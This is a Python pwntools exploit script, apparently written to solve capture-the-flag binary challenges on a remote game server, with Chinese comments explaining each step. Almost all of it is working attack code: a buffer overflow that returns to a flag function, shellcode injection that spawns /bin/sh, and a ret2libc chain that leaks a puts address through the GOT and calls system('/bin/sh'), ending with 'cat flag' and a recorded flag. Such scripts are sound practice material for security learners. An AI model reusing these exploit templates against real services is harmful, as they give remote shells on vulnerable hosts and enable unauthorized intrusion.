import time
from pwn import *
import os


class Util:
    def use_randoms(length: int, char: chr = None, encoding: str = 'ascii'):
        if not enable_use_randoms or char:
            if not char:
                char = 'a'
            r = char * length
        else:
            r = randoms(length, string.ascii_letters)
        return r.encode(encoding)

    def start_process(target: str):
        os.system(f'chmod 777 {target}')
        p = process(target)
        return p


def se(data): return r.send(data)
def sa(delim, data): return r.sendafter(delim, data)
def sl(data): return r.sendline(data)
def sla(delim, data): return r.sendlineafter(delim, data)
def sea(delim, data): return r.sendafter(delim, data)
def rc(numb=4096): return r.recv(numb)
def rl(): return r.recvline()
def ru(delims): return r.recvuntil(delims)
def uu32(data): return u32(data.ljust(4, b'\0'))
def uu64(data): return u64(data.ljust(8, b'\0'))
def info_addr(tag, addr): return r.info(tag + ': {:#x}'.format(addr))


use_randoms = Util.use_randoms


enable_use_randoms = False
target: str = './tutorial2'
# elf = ELF(target)
# r = Util.start_process(target)
r = remote('redirect.do-not-trust.hacking.run', 10190)
addr_get_flag = 0x8048f0d
input_len = 32
padding_len = 28 + 4
# I -> you : 1char to 3char : I * 20 + AAAA = 64
sla(b'Tell me', ('I'*20 + 'AAAA').encode('ascii') + p32(addr_get_flag))
# sl('ls')
r.interactive()
sys.exit(0)

gamebox = ELF(target)


context.os = 'linux'
context.arch = 'amd64'  # i386 amd64
context.log_level = 'debug'


def ret2func():
    start_addr = 0x0400636
    write_plt = gamebox.plt['write']
    write_got = gamebox.got['write']
    addr_get_flag = gamebox.symbols['get_flag']
    addr_exit = gamebox.symbols['exit']
    addr_backdoor = 0x0400490
    pop_rdi_ret = 0x0400683  # 寻找一个可以pop rdi的语句
    addr_binsh = 0x0601048


def rop_chain():
    # chain = get_chain()
    # payload = use_randoms(45) + chain
    # sl(payload)
    # sl('ls')
    # sl('cat flag')
    # r.interactive()
    # sl(payload)
    pass


def ret2libc_so():
    # libc = ELF('libc-2.23.so')
    # base_libc = addr_write - libc.symbols['write']
    # print('base_libc', base_libc)
    # addr_system = libc.symbols['system'] + base_libc
    # addr_binsh = libc.search(b'/bin/sh').__next__() + base_libc
    # print(addr_system, addr_binsh)
    # s1 = p32(addr_system)
    # s2 = p32(addr_binsh)
    # payload = padding + s1 + p32(start_addr) + s2
    pass


def debug(cmd=''):
    gdb.attach(r, cmd)


def ret2shellcode():
    sh = asm(shellcraft.sh())
    p1 = sh
    sla('name\n', p1)
    name_addr = 0x601080
    p2 = flat(['a'*0x28, name_addr])
    sla('me?\n', p2)
    r.interactive()
    pass


def ret2libc_leak():
    pop_rdi_ret = p64(0x0400713)  # 寻找一个可以pop rdi的语句

    v_padding = use_randoms(32+8)  # buff + s让溢出点到r的位置，以控制返回函数

    def leak_symbol(symbol_name: str, printf_name: str = 'puts'):
        sl('233')  # input name
        method_plt = gamebox.plt[printf_name]
        method_got = gamebox.got[symbol_name]
        payload = v_padding + pop_rdi_ret + \
            p64(method_got)  # 控制rdi（函数的第一个参数设置为 目标函数的.got）
        start_addr = gamebox.symbols['_start']
        # 使用printf函数打印待泄露函数，并返回程序起点等待二次利用
        payload += p64(method_plt) + p64(start_addr)
        sla('What do you want to say to me?\n', payload)
        v_leak = rl()[:-1]  # 接收并去除末尾的\n
        v_leak_hex = uu64(v_leak)
        print(f'rec:{v_leak},hex:{hex(v_leak_hex)}')
        return v_leak_hex

    target_method = 'puts'
    leak_func_target = leak_symbol(target_method)
    # 寻找对应的版本，可能会返回多个，需要逐个测试
    libc = LibcSearcher(target_method, leak_func_target)
    libc_offset = leak_func_target - libc.dump(target_method)
    addr_system = libc_offset + libc.dump('system')
    addr_binsh = libc_offset + libc.dump('str_bin_sh')

    ret = 0x04006AA  # start的返回地址，用于正常结束
    payload2 = v_padding + p64(ret)
    payload2 += pop_rdi_ret + p64(addr_binsh) + \
        p64(addr_system)  # 重新溢出，使用system('/bin/sh')
    sl('233')  # input name
    sl(payload2)
    sl('cat flag')  # flag{e8165d23-782e-47fd-9c16-0a002b1f08bd}
    r.interactive()


ret2shellcode()
